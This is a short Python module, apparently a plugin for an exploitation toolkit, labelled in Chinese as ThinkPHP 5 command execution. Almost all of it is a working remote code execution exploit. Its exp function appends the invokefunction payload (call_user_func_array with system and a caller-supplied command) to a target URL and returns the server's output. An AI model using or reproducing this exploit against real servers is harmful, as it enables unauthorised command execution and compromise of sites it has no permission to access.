# -*- coding:utf-8 -*-
# Thinkphp5命令执行

from .. import requestUtil


def thinkphp_rce(url):
    resp = requestUtil.get(url)
    return "\n".join(resp.text.split("\n")[:-1])

def exp(service, cmd, content=""):
    url = service.url + r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%s"%cmd
    return thinkphp_rce(url)
